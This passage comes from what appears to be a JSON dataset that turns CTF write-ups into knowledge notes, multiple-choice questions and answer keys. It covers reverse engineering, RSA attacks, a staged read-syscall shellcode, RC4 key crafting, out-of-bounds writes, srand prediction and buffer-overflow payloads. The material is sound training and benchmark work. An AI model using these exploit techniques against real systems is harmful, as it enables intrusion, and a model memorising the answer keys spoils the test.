            "Data necessary for decryption or key generation embedded within a binary can sometimes be found in plaintext or in a slightly obfuscated form. In challenges involving encrypted or obfuscated data, examine the binary's data segments and strings for potential keys, passphrases, or patterns. This is essential when the program uses these embedded strings to manipulate or transform data (such as generating a flag). \n\nSample of payload to simplify the process based on the provided write-up:  \n```\nflag[i % LENGTH] ^= key[i % KEY_LENGTH];  \n```\nThis simplification assumes `LENGTH` is the size of the flag array and `KEY_LENGTH` is the size of the key used to encode or decode the flag, with `i` iterating through the number of required transformations derived from the analysis."
        ],
        "question": [
            "In the context of analyzing a binary program for hidden functionalities, where a loop iterating 9747 times performs data transformation using XOR operations, which of the following best describes the effective approach for simplifying the analysis?  - A. Modify the condition of the loop to decrease the number of iterations arbitrarily. - B. Calculate the total number of iterations needed by finding the Least Common Multiple (LCM) of the cycle lengths involved in the transformation. - C. Increase the increment step of the loop counter to skip unnecessary iterations. - D. Completely remove the loop and manually calculate the final state of the data. ",
            "When examining a binary's data segments for potential keys used in data manipulation, such as flag generation, which method is effective for uncovering the necessary string or passphrase embedded within the binary?  - A. Scanning the binary for high entropy segments that indicate encrypted data. - B. Searching for ASCII strings that could represent user inputs or messages. - C. Examining the data segments for plain strings or slightly obfuscated forms that could be used in transformations. - D. Disregarding all strings and focusing solely on binary patterns for potential keys. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "rev_Trampoline",
        "write_up": "dataset/raw/rev_Trampoline.md",
        "type": "The type of challenge is \"reverse\".",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing obfuscated binary challenges in which direct static analysis tools (like Ghidra) fail to decompile the code due to complex control flows or an extensive number of branches, resorting to manual disassembly analysis can provide crucial insights. Specifically, patterns of instructions (e.g., `DEC` and `INC` operations) can be linked to the logic of the program, such as determining characters in a flag by the number of operations performed before a control flow change (like a jump).",
            "In binary reverse engineering challenges, where the objective is to deduce a string or flag from assembly code, a script can be efficiently used to parse disassembly to automate the extraction process. This involves identifying patterns that directly relate to the ASCII values of characters (for instance, the count of decrement (`DEC`) instructions before an increment (`INC`) instruction that signifies the end of a segment) and converting these patterns into their character equivalents to reconstruct the flag.\n\nSample Script to Automate Extraction:\n```python\ndec_list = []\ndec = 0\nfor line in fat.split('\\n'):\n    if 'DEC' in line:\n        dec += 1\n    else:\n        if dec > 0:\n            print(f'DEC ENDS HERE {dec} NUMBER OF DECS')\n            dec_list.append(dec)\n        dec = 0\nprint(''.join([chr(x) for x in dec_list]))\n```\nThis script could be used to automate the parsing of certain disassembly patterns to recover obfuscated strings or flags based on the number of specific assembly instructions (like `DEC` operations) observed before hitting a control flow instruction or NOP sled (`INC` operations followed by multiple `NOP`s), indicating the end of a meaningful code sequence."
        ],
        "question": [
            "In a binary reverse engineering task, you are analyzing assembly code and notice a pattern of multiple `DEC RAX` instructions followed by a single `INC RAX` instruction. This pattern could be indicative of a specific technique used in obfuscation. What does the sequence of `DEC` operations followed by an `INC` operation most likely represent in this context? - A. A loop structure implementing counter-based iterations - B. A diversion tactic to mislead automated decompilation tools - C. Encoding the ASCII value of a character in the obfuscated flag - D. An error in the program code that could lead to incorrect program behavior ",
            "When faced with the challenge of extracting a flag from a piece of assembly code where characters are represented by the count of decrement (`DEC`) instructions preceding an increment (`INC`) instruction, which approach is most efficient for automating this extraction? - A. Translating each `DEC` and `INC` instruction to equivalent C code for analysis - B. Running the assembly code in a debugger step by step to observe register changes - C. Writing a Python script to count `DEC` instructions before each `INC` and converting the counts to characters - D. Manually counting each sequence of `DEC` operations and matching them to ASCII values "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Rewind",
        "write_up": "dataset/raw/Rewind.md",
        "type": "forensics",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 150,
        "max_score": 1285,
        "difficulty": 0.11673151750972763,
        "knowledge": [
            "For forensics challenges involving examining disk images or memory dumps, use tools like `strings` to quickly search for plaintext patterns common in flags (e.g., \"flag{\"). This method can rapidly identify if sensitive or flag-related data is available in plaintext without the need for deeper forensic analysis. Example command: `strings disk.img | grep \"flag{\"`.",
            "When a CTF challenge mentions or implies the use of virtual machine snapshots or recordings (like QEMU's replay feature), investigate the possibility that the challenge's solution involves replaying or analyzing these VM interactions to uncover the flag. This may require familiarity with specific virtualization tools and their capabilities for recording and replaying user interactions and system events."
        ],
        "question": [
            "In a forensic analysis of a disk image to check for potential flags, which command can be used effectively to search for plaintext flag patterns? - A. `grep -r \"flag{\" disk.img` - B. `find / -name \"flag{\"` - C. `strings disk.img | grep \"flag{\"` - D. `cat disk.img | grep -o \"flag{\"`",
            "If a Capture The Flag (CTF) challenge is centered around a scenario involving the replay of a virtual machine's interactions, which feature of QEMU is most likely relevant to solving the challenge? - A. QEMU's live migration feature - B. QEMU's snapshot and restore capability - C. QEMU's replay feature for virtual machine interactions - D. QEMU's hardware virtualization support"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Re_ Plaid Party Planning",
        "write_up": "dataset/raw/Re_ Plaid Party Planning.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2018",
            "https://ctftime.org/event/617/tasks/"
        ],
        "score": -1.0,
        "max_score": 800,
        "difficulty": -1,
        "knowledge": [
            "When tackling complex graph-based problems, particularly ones involving finding minimum paths that additionally require each node (person) to visit a specific set of nodes (cities with food) en route to a common destination, Dijkstra's algorithm is a potent tool for determining the shortest path between nodes in a weighted graph. The application extends to determining the shortest path for each person to the cities with required pickups before heading to the destination. This approach is useful under the condition that the graph represents a set of locations connected by paths with associated travel times or costs.",
            "The process of optimizing solutions involving permutations, especially when dealing with assignments of tasks (e.g., picking up food items) to agents (people traveling), can greatly benefit from a combination of greedy algorithms for initial approximation and brute-force algorithms with pruning for exact solutions. The greedy algorithm quickly provides a reasonably good solution by making locally optimal choices, such as swapping assignments to reduce total travel time. The brute-force approach systematically explores all possible assignments to ensure the optimal solution is found. Pruning enhances efficiency by eliminating paths that cannot lead to an improvement over the best solution found so far. This technique is particularly useful in scenarios where the objective is to minimize a certain metric (e.g., total travel time) while adhering to specific constraints (e.g., each person picks up exactly one food item).\n\nExample of pruning logic in pseudo-code:\n```\nbest_distance = greedy_algorithm_solution()\nfunction explore_branch(current_distance, level):\n    if current_distance >= best_distance:\n        return  # Pruning condition\n    if level == last_level:\n        best_distance = min(current_distance, best_distance)\n        return\n    for each food_assignment in possible_assignments[level]:\n        explore_branch(current_distance + distance_matrix[level][food_assignment], level + 1)\n```"
        ],
        "question": [
            "In the context of solving a graph-based optimization problem where you need to find the minimum total travel time for several people to pick up food from specified cities and then meet at a common city, which algorithm is most suitable for initially determining the shortest path between each person and the cities with food? - A. Dijkstra's algorithm - B. Breadth-First Search (BFS) - C. Depth-First Search (DFS) - D. Bellman-Ford algorithm ",
            "When addressing a problem involving the assignment of tasks to agents to minimize total travel time, where each agent must pick up exactly one item and all items need to be picked up, which strategy combines both approximation and precision to ensure an optimal solution? - A. Using only a brute-force algorithm - B. Employing a greedy algorithm followed by a brute-force search with pruning - C. Relying solely on a greedy algorithm - D. Implementing depth-first search with backtracking "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Re_Montagy",
        "write_up": "dataset/raw/Re_Montagy.md",
        "type": "This CTF challenge is of the type crypto.",
        "competition": [
            "RealWorld/2021",
            "https://ctftime.org/event/1198/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In blockchain challenges involving smart contracts, exploring the possibility of utilizing equivalent keys for hash functions can enable the alteration of contract bytecodes without changing the hash value. This approach can be particularly effective when dealing with cryptographic functions like the TEA (Tiny Encryption Algorithm) that exhibit vulnerability to equivalent key attacks. Equivalent keys allow for the flipping or changing of certain opcode pairs in the contract's bytecode, provided these changes occur at specific byte intervals (such as changing bytes at positions that align with the key division in the encryption process).",
            "For challenges requiring manipulation of contract execution flow, Jump Oriented Programming (JOP) can be an invaluable technique. JOP involves controlling the execution flow of a contract by carefully manipulating the stack and the program counter through crafted inputs, enabling indirect control over the contract's behavior. This method relies on finding and using available opcodes within the contract that can facilitate arbitrary execution through strategic jumps, often illuminated by backdoor insertions or modifications made possible by exploiting weaknesses like equivalent keys in the contract's cryptographic functions."
        ],
        "question": [
            "When attempting to alter the bytecode of a smart contract without changing its hash output, which technique related to the Tiny Encryption Algorithm (TEA) could be utilized? - A. Flipping MSB of input values before hashing - B. Utilizing equivalent keys to change pairs of opcodes at specific byte intervals - C. Applying a different hashing algorithm to generate a new hash - D. Encrypting the bytecode with a public key before submission",
            "In a scenario where controlling the execution flow of a contract is necessary, and direct manipulation of the contract's code is not feasible, which programming technique can be effectively applied based on opcodes and the program counter? - A. Object-Oriented Programming (OOP) for adjusting method calls - B. Procedural Programming by modifying the sequence of execution - C. Jump Oriented Programming (JOP) to manipulate the stack and program counter through crafted inputs - D. Functional Programming to redefine functions within the contract"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Re_Sign",
        "write_up": "dataset/raw/Re_Sign.md",
        "type": "This challenge is a **crypto** type CTF challenge.",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 206,
        "max_score": 952,
        "difficulty": 0.21638655462184875,
        "knowledge": [
            "In a challenge involving analysis or reverse engineering of binary code to derive a Base64 encoded string, one may encounter arrays representing index values that map to characters in a standard Base64 character set (e.g., \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"). To extract the Base64 encoded message, iterate through the index array, translating each index to its corresponding character in the Base64 character set. This method can be particularly useful in scenarios where the encoded message is obfuscated within the binary and is not directly visible.",
            "For challenges where a string is XOR-ed with its index or a similar simple algorithm to obfuscate data, iterating over the obfuscated array and applying the reverse of the applied obfuscation method (e.g., XOR-ing each character with its index again) will reveal the original string. This technique is widely applicable in scenarios involving basic XOR obfuscation, especially when the obfuscation pattern is consistent, like each character being XOR-ed with its index or a fixed key.\n\nExample payload to reverse XOR obfuscation:  \n```python\n# Assuming list_41E380 represents the obfuscated array and its elements are XOR-ed with their respective indices.\noriginal_list = [chr(list_41E380[i] ^ i) for i in range(len(list_41E380))]\nprint(''.join(original_list))\n```"
        ],
        "question": [
            "In a given challenge, a programmer is tasked with decoding a Base64 encoded string represented by an array of integer indices. These indices map to characters in a typical Base64 character set: \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\". Given an array named `int32_41E3D0` with values { 8, 59, 1, 32, ... }, which of the following code snippets correctly decodes the Base64 encoded message? - A. `decoded_message = ''.join([chr(int32_41E3D0[i]) for i in range(len(int32_41E3D0))])` - B. `decoded_message = ''.join([\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"[i] for i in int32_41E3D0])` - C. `decoded_message = ''.join([\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"[int32_41E3D0[i]-1] for i in range(len(int32_41E3D0))])` - D. `decoded_message = ''.join([int32_41E3D0[i] - 1 for i in range(len(int32_41E3D0))])`",
            "Within the challenge's context, an obfuscated string is created by XOR-ing each character with its index in the array. To reverse this process and retrieve the original string from the array `list_41E380` ({ 48, 48, 48, 48, ... }), which one of the following options demonstrates the correct approach? - A. `original_string = ''.join([chr(i ^ list_41E380[i]) for i in range(64)])` - B. `original_string = ''.join([chr(list_41E380[i]) for i in range(64)])` - C. `original_string = ''.join([chr(list_41E380[i] ^ 64) for i in range(64)])` - D. `original_string = ''.join([chr(i) for i in list_41E380])`"
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Rick Sanchez Algorithm",
        "write_up": "dataset/raw/Rick Sanchez Algorithm.md",
        "type": "crypto",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 158,
        "max_score": 1000,
        "difficulty": 0.158,
        "knowledge": [
            "When faced with RSA encryption challenges, if the public exponent `e` is noticeably large compared to the modulus `n`, Wiener's attack can be applied, especially if the decryption exponent `d` is small. Wiener's attack is viable in cases where conventional factorization methods might not reveal `n`'s factors directly. To implement this, one can use the `owiener` Python module. Example command to install `owiener`: `python3 -m pip install owiener`.",
            "To apply Wiener's attack in a Python script, after obtaining the RSA variables (ciphertext `C`, modulus `n`, and exponent `e`), utilize the `owiener.attack(e, n)` function to potentially find the secret decryption exponent `d`. If `d` is found, the plaintext `m` can be recovered by computing `m = pow(C, d, n)` and converting `m` to readable format, usually with `Crypto.Util.number.long_to_bytes(m).decode()`. If Wiener's attack does not succeed, it implies the attack's conditions aren't met (e.g., `d` is not sufficiently small in relation to `n`)."
        ],
        "question": [
            "In the context of RSA encryption where you encounter a large public exponent `e` and a relatively small decryption exponent `d`, which Python module is recommended for implementing Wiener's attack to potentially decrypt a message?  - A. sympy - B. numpy - C. owiener - D. scipy ",
            "When attempting to decrypt RSA encrypted data using Wiener's attack with the Python `owiener` module, after obtaining ciphertext `C`, modulus `n`, and public exponent `e`, which of the following Python commands correctly illustrates the usage of this attack to find the secret decryption exponent `d` and subsequently decrypt the message?  - A. `d = owiener.decrypt(e, n); m = pow(C, d, n)` - B. `d = owiener.attack(e, n); m = pow(C, d, n)` - C. `d = owiener.recover(e, n); m = C ** d % n` - D. `d = owiener.find_d(e, n); m = C ** d % n` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RickNMorty",
        "write_up": "dataset/raw/RickNMorty.md",
        "type": "pwn",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge that involves mathematical computation, especially if it involves sequences or patterns generated by functions, the effective approach is to reverse engineer the code (if available) to understand how the sequence or pattern is generated. This involves analyzing each function in the code to replicate the mathematical operations accurately. Python scripts can be highly effective for replicating such functions and generating the required response or output.",
            "For challenges that require real-time interaction with a server, such as supplying computed answers within a specific time frame, use automation tools like pwntools in Python. This tool can automate the process of connecting to the server, reading input (such as pairs of numbers), processing the input through the replicated functions to compute responses, and then sending these responses back to the server. In scenarios requiring timely responses to keep a session active or to satisfy a condition within a certain timeframe, automation with error handling can ensure responses are calculated and submitted without human delay, which is crucial for passing timed challenges.\n\nExample Payload:\n```python\nfrom pwn import *\n\n# Use pwntools to establish a connection to the challenge server\np = remote('chall.csivit.com', 30827)\n\ndef fun1(param_1, param_2):\n    # Function logic replicated from the challenge\n    local_c = 0\n    local_10 = 1\n    while (local_10 <= param_1) or (local_10 <= param_2):\n        if (param_1 % local_10 == 0) and (param_2 % local_10 == 0):\n            local_c = local_10\n        local_10 += 1\n    return local_c\n\ndef fun2(param_1):\n    # Function logic replicated from the challenge\n    if param_1 == 0:\n        return 1\n    else:\n        return param_1 * fun2(param_1 - 1)\n\nwhile True:\n    line = p.recvline()\n    if not line or line.decode().startswith('fun() took'):\n        break\n    nums = line.decode().rstrip().split(' ')\n    ans = fun1(int(nums[0]), int(nums[1]))  # Process input with fun1\n    ans = fun2(ans + 3)  # Process result of fun1 with fun2\n    p.sendline(str(ans))  # Send the answer back\n\np.stream()  # Receive the remainder of the stream (flag or any other output)\n```"
        ],
        "question": [
            "In a CTF challenge, you are given a segment of C code involving operations with random numbers that are processed through two functions, `function1` and `function2`. The objective is to replicate the logic of these functions in Python. Given the pseudocode translation of `function2` provided below, which option accurately replicates its functionality in Python?  ```c long function2(long param_1) { long lVar1;  if (param_1 == 0) { lVar1 = 1; } else { lVar1 = function2(param_1 - 1); lVar1 = lVar1 * param_1; } return lVar1; } ``` - A. ```python def function2(param_1): return 1 if param_1 == 0 else param_1 * function2(param_1 - 1) ``` - B. ```python def function2(param_1): if param_1 == 0: return 1 else: return function2(param_1 + 1) ``` - C. ```python def function2(param_1): result = 1 for i in range(1, param_1): result *= i return result ``` - D. ```python def function2(param_1): if param_1 == 0: return param_1 else: return function2(param_1 - 1) ```",
            "You are working on a CTF challenge that involves sending computed responses back to a server using Python. The challenge involves connecting to the server, waiting for the server to send a pair of numbers, calculating the answer based on a specific algorithm, and then sending the answer back to the server. Given this scenario, which Python code snippet efficiently and correctly automates this process?  - A. ```python while True: response = input() print(\"Answer computed\") ``` - B. ```python from pwn import remote  p = remote('localhost', 12345)  while True: data = p.recvuntil('\\n') computed_answer = 42  # Placeholder for actual computation p.send(str(computed_answer)) ``` - C. ```python import requests  response = requests.get('http://example.com') print(response.text) ``` - D. ```python import socket  s = socket.socket() s.connect(('localhost', 12345))  while True: msg = s.recv(1024) print(\"Message received\") ```"
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "RIPC4",
        "write_up": "dataset/raw/RIPC4.md",
        "type": "crypto",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 484,
        "max_score": 493,
        "difficulty": 0.9817444219066938,
        "knowledge": [
            "In a challenge that involves shellcode injection where the allocated memory for the encryption state is executable (PROT_EXEC), creatively crafting a first-stage shellcode that reads in a more complex second-stage shellcode can be an effective way to bypass byte-specific constraints. The first-stage shellcode should perform minimal tasks like setting up a syscall to read further instructions into memory, thus avoiding the restrictions imposed by the initial encryption or encoding state.  \nExample first-stage shellcode:  \n```assembler  \n31 ff       xor    edi,edi  \nf7 e7       mul    edi  \n48 89 ce    mov    rsi,rcx // rcx contains the beginning of this RWX page  \nb6 04       mov    dh,0x4  \n0f 05       syscall // read(0, page, 0x400)  \n```",
            "When faced with the task of generating a specific output state with an encryption algorithm like RC4 for cryptographic challenges, crafting a script to precisely control the initial state or key to achieve a desired output state can be invaluable. This approach can be used to ensure that the encryption state starts with a payload that is executable as shellcode. The script would generally involve shuffling or manipulating the encryption algorithm's state to align with the target output.  \nExample concept (detailed implementation would depend on the challenge specifics):  \n```python  \nimport random\n\n# Initial RC4 state and target state setup\nstate = range(256)    \ntarget = range(256)  \n\n# Define the shellcode bytes you want at the beginning of the RC4 state\nshellcode = [0x31, 0xff, 0xf7, 0xe7, 0x48, 0x89, 0xce, 0xb6, 0x04, 0x0f, 0x05]  \ntarget = filter(lambda c: not c in shellcode, target)\n\nrandom.shuffle(target)  # Shuffle or manipulate to fit the target starting state\ntarget = shellcode + target  # Ensuring the desired shellcode is at the beginning\n\n# The following logic would aim to adjust the RC4 state to start with the shellcode\n# (Pseudo-implementation. Real logic depends on the intricacies of the RC4 adjustments needed)\nkey = ''  \njval = 0\n\nfor i in range(256):  \n   tnode = target[i]  \n   tgval = state.index(tnode)  \n   # Logic to adjust key based on the target state and initial state relations\n   # This is a simplified illustration; actual implementation may vary significantly\n\nprint(key)  # Output the key that aligns the RC4 state as desired\n```"
        ],
        "question": [
            "In the context of a CTF challenge involving direct memory access via shellcode injection where the memory allocated for encryption state is marked as executable (using flags like PROT_EXEC), what technique can be utilized in the first-stage shellcode to avoid constraints like duplicate bytes or restricted instruction set? The scenario involves a situation where directly executing complex shellcode is not feasible due to the encryption state's limitations. - A. Write a shellcode that immediately executes a 'jmp' instruction to jump past the encryption state memory. - B. Design a shellcode to perform arithmetic operations to generate restricted byte values dynamically. - C. Utilize a shellcode that executes a syscall to read in a more complex second-stage shellcode into the executable memory space, allowing for a broader range of instructions and capabilities. - D. Implement a shellcode that patches the running program\u2019s code section to bypass memory execution restrictions. ",
            "In a cybersecurity challenge requiring the manipulation of the RC4 encryption algorithm's initial state or key to start with a specific shellcode, which approach is essential for generating a specific output state that matches a desired executable payload? - A. Randomly generating RC4 keys until the output state accidentally starts with the desired shellcode. - B. Manually setting the RC4 state array to the values desired, ignoring the key-scheduling algorithm. - C. Using a script to carefully determine an RC4 key that, when processed through the key-scheduling algorithm, results in an initial state that begins with the desired shellcode, taking into account the specific requirements such as avoiding duplicate bytes. - D. Modifying the RC4 algorithm to accept shellcode as its key, ensuring the output state is always the shellcode itself. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "riscy-stack_ Userspace",
        "write_up": "dataset/raw/riscy-stack_ Userspace.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When dealing with userspace binary exploitation challenges, especially on unfamiliar architectures such as RISC-V, the initial approach should include analyzing the binary's behavior, system call table, binary loading address, and permissions set on the memory pages. This foundational analysis is crucial for understanding the attack surface and planning an exploitation strategy. For RISC-V binaries loaded into a memory page with RWX (Read-Write-Execute) permissions, one can leverage this to inject and execute shellcode within the same page. This is particularly applicable in scenarios where the binary facilitates arbitrary read/write operations due to insufficient bounds checking.",
            "In challenges that involve manipulation of application-level data structures (like an array of notes or messages), executing an out-of-bounds write vulnerability can be crucial for achieving code execution or leaking information. Specifically, if an application fails to enforce lower bounds on array indices, an attacker can perform an out-of-bounds write by calculating an offset that leads to a controlled memory area. In scenarios where the binary or a critical data structure is loaded in memory close to user-controlled data, calculating the exact offset to overwrite specific binary sections (like the GOT, return addresses, function pointers) can enable arbitrary code execution. For instance, if a binary is loaded at `0x08000000` and a writable array is positioned at a predictable location such as `0x7ffeff38`, calculating the negative offset required to overwrite binary content from the array's base can be done as follows: Calculate the difference between the target address and the base of the binary, then adjust the value to match the array's indexing scheme (e.g., dividing by the element size, if necessary).\n\nExample of calculating the offset for an out-of-bounds access leading to arbitrary code execution:\n```python\nbinary_base = 0x08000000\narray_base = 0x7ffeff38\nelement_size = 4  # Assuming 4-byte elements (integers, pointers, etc.)\ntarget_address = 0x28c  # Example target offset within the binary for injecting shellcode\n\noffset = (binary_base - array_base) // element_size  # Calculate the offset needed\nprint(f\"Offset to reach the binary's target address: {offset}\")\n```"
        ],
        "question": [
            "In a userspace binary exploitation challenge involving a RISC-V architecture, the binary is loaded with RWX permissions at `0x08000000`. This scenario suggests a potential for exploiting the binary by injecting and executing shellcode. Given this setup, what is a crucial step in the preparation of the shellcode for execution in such an environment? - A. Write shellcode directly to the binary's entry point to ensure immediate execution. - B. Calculate the offset needed to perform an out-of-bounds write to place the shellcode in a readable and executable memory area. - C. Encrypt the shellcode to bypass potential security mechanisms like antivirus software. - D. Focus on designing shellcode that escapes memory pages with RWX permissions.",
            "When exploiting an out-of-bounds write vulnerability in a scenario where a userspace binary loaded at `0x08000000` allows for arbitrary read/write operations with insufficient bounds checking, an attacker aims to calculate a negative offset to overwrite the binary content. Given a writable array positioned at `0x7ffeff38`, how does one calculate the negative offset required to reach the base of the binary for potential code execution? - A. Subtract the array base address from the binary base address and divide by the size of array elements. - B. Add the array base address to the binary base address and multiply by the element size. - C. Divide the difference between the binary base address and the array base address by the size of the executable code section. - D. Multiply the binary base address by the array base address to find the direct offset without considering the size of array elements."
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Rivest Shamir Adleman",
        "write_up": "dataset/raw/Rivest Shamir Adleman.md",
        "type": "crypto",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "In scenarios where the RSA modulus (n) is not too large or when traditional methods fail, a brute-force approach can be used to factorize the modulus (n) to find primes (p) and (q) efficiently, especially when using optimized scripting languages or environments like pypy for faster execution. This method can be directly applied to obtain the prime factors required for further decryption steps in RSA challenges. Example script snippet for brute-forcing prime factors:\n```python\nfor i in range(2, 100000000):  \n if n % i == 0:  \n   p = i  \n   q = n//p  \n   print(\"p:\", p, \"q:\", q)  \n   break\n```",
            "After obtaining the prime factors (p and q) of the RSA modulus (n), the decryption key (d) can be computed using Euler's totient function (phi), which is calculated as (p-1)*(q-1), and then finding the modular multiplicative inverse of e modulo phi. This method is fundamental for decrypting the ciphertext in RSA challenges once the prime factors are known. Example snippet for calculating decryption key and decrypting message:\n```python\nphi = (p-1) * (q-1)\nd = pow(e, -1, phi)\nM = pow(c, d, n)  # Or for byte conversion: M = bytes.fromhex(hex(pow(c,d, n))[2:])\nprint(M)\n```"
        ],
        "question": [
            "In a scenario where the RSA modulus \\(n\\) [a large integer] needs to be factored to retrieve the prime numbers \\(p\\) and \\(q\\) for further cryptographic operations, and given the modulus is not extremely large, which of the following approaches is the most efficient? - A. Utilize general-purpose mathematical software to perform symbolic calculations. - B. Apply a brute-force script in a high-performance computing environment to find factors directly. - C. Employ a database of known prime numbers to check for divisibility. - D. Construct a quantum computer to exploit quantum factorization algorithms. ",
            "After factoring the RSA modulus \\(n\\) into its prime components \\(p\\) and \\(q\\), to decrypt a ciphertext \\(C\\) encrypted with a public exponent \\(e\\), the correct sequence of operations involves calculating the totient (\\(\\phi\\)), finding the modular multiplicative inverse of \\(e\\) mod \\(\\phi\\) to get \\(d\\), and finally computing \\(M = pow(C, d, N)\\). Which of the following steps is crucial in deriving the decryption key \\(d\\)? - A. Calculate the greatest common divisor (GCD) of \\(e\\) and \\(n\\). - B. Compute \\(\\phi\\) using the formula \\((p-1) \\times (q-1)\\). - C. Sum the values of \\(p\\) and \\(q\\) and then subtract \\(n\\). - D. Perform a linear congruence theorem to directly calculate \\(d\\) without using \\(\\phi\\). "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "rntk",
        "write_up": "dataset/raw/rntk.md",
        "type": "pwn",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When a binary uses `srand` seeded with the current time (`time(NULL)`) for generating pseudo-random numbers, the sequence can be predicted if an attacker can synchronize their attack to run at the same time as the seeding occurs. This is because `srand()` initializes the pseudo-random number generator with a predictable seed value (current time), leading to a predictable sequence of numbers generated by `rand()`.\n    - To exploit, attackers can seed their own pseudo-random number generator with the same current time value to predict the numbers that the challenged binary will generate.\n    - Example exploitation code segment:\n    ```python\n    from ctypes import *\n    libc = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so')\n    _time = libc.time(0x0)\n    libc.srand(_time)\n    guess = libc.rand()\n    ```",
            "In scenarios where input causes a stack buffer overflow, determining the correct offset to overwrite function return addresses or other control flow-determinant variables is essential for successful exploitation. This can often be achieved through the use of pattern generation and analysis tools (e.g., `cyclic` in pwntools), whereby a unique sequence of bytes is sent to the program, and the offset at which the program crashes indicates the exact position necessary to control the flow.\n    - For a binary susceptible to buffer overflow attacks, an attacker must craft a payload that carefully places the guessed or known value (such as a canary or return address) at the calculated offset. The payload often consists of a combination of controlled values and padding bytes.\n    - Example payload layout for buffer overflow exploitation:\n      ```python\n      payload = guessed_value + b\"A\"*offset + overwrite_value\n      ```\n      where `guessed_value` is what needs to be guessed correctly for the exploit (e.g., a pseudo-random number), `offset` is the number of padding bytes needed to reach the overflow target, and `overwrite_value` is the intended value to take control of the program flow (e.g., an address of the `win` function)."
        ],
        "question": [
            "When attempting to execute a successful exploit against a binary that uses `time(NULL)` as a seed for `srand` to generate a sequence of pseudo-random numbers, which of the following approaches would allow an attacker to predict the sequence of numbers generated by `rand()` within the binary? - A. Alter the system clock to a future time after the binary generates its numbers, then seed `srand` with this future time. - B. Seed `srand` with a hardcoded, well-known past time value and predict numbers based on this known seed. - C. Monitor the binary's execution to intercept the seed value at runtime, then use this intercepted value to seed `srand`. - D. Seed the attacker's own pseudo-random number generator with the current time synchronized to the binary's seeding time, thus predicting the sequence.",
            "In a binary susceptibility to stack buffer overflows, determining the exact offset necessary for overwriting a specific variable (like a function's return address) can be critical for control flow hijacking. Considering a scenario where `cyclic` patterns are utilized for this purpose, which statement best describes the process for crafting an exploit payload? - A. Generate a `cyclic` pattern that exceeds the buffer size and use it directly as payload without identifying the offset. - B. Identify the offset using static analysis only, then guess the padding required to reach the precise memory location. - C. Use `cyclic` to generate a unique pattern, cause a crash, and then use the crash point to identify the offset for the payload. - D. Craft a payload with random bytes as padding until the buffer overflows, without calculating the specific offset needed."
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Robert",
        "write_up": "dataset/raw/Robert.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 194,
        "max_score": 477,
        "difficulty": 0.40670859538784065,
        "knowledge": [
            "For challenges involving inverse mathematical functions where direct computation is difficult or impractical, considering the mathematical properties of the function can lead to alternative solutions. Specifically, when the challenge involves computing values such that \\(carmichael\\_lambda(n) = m\\), one can leverage the knowledge that \\(m\\) might be derived from a semi-prime (i.e., \\(m = \\lambda(pq)\\)) and use this property to find \\(n\\) by enumerating over divisors of \\(m\\). This method hinges on the assumption that \\(m\\) is related to the Carmichael function of a product of two primes.",
            "When tasked with inverse problems of cryptographic functions, leveraging auxiliary mathematical tools and scripting can automate the search for solutions. Utilizing tools such as SageMath for computations involving prime numbers, least common multiples (LCM), and divisors, combined with scripts for automated interaction with challenge servers (using libraries like `pwntools`), can successfully solve challenges that seem intractable by pure theoretical analysis. This approach is particularly useful when the solution involves brute-forcing through a set of possible solutions derived from the mathematical properties of the given problem.  \nExample sage script snippet for automated solution finding:\n```python\nfrom pwn import remote  \n# Set up connection to challenge server\nio = remote(\"example.ctf.com\", 12345)\n\n# Function to attempt finding n given m, leveraging specific mathematical properties\ndef reverse_lambda(n):  \n   for x in divisors(n):  \n       for y in divisors(n):  \n           if lcm(x, y) == n and is_prime(x + 1) and is_prime(y + 1):  \n               return (x + 1) * (y + 1)  \n```\nThis snippet shows setting up a remote connection to a CTF challenge server and implementing a function that attempts to reverse engineer the challenge's requirement by brute-forcing through divisors of a given number 